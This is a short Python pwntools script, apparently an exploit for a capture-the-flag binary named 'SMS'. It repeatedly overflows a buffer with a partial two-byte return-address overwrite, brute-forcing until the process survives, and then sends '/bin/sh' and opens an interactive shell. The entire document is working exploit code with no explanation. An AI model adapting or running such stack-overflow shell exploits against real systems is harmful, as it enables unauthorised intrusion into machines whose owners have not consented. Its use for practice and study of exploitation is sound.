from pwn import*
context.update(arch = 'amd64', os = 'linux')
i=0
while True:
    i+=1
    print:i
    p=process('./SMS')
    payload="a"*40
    payload+='\xca'
    p.sendline(payload)
    p.recv()
    payload='a'*200+'\x01\x99'
    p.sendline(payload)
    p.recv()
    try:
        p.recv(timeout=1)
    except  EOFError:
        p.close()
        continue
    else:
        pause()
        p.sendline('/bin/sh\x00')
        sleep(0.1)
        p.interactive()
        break
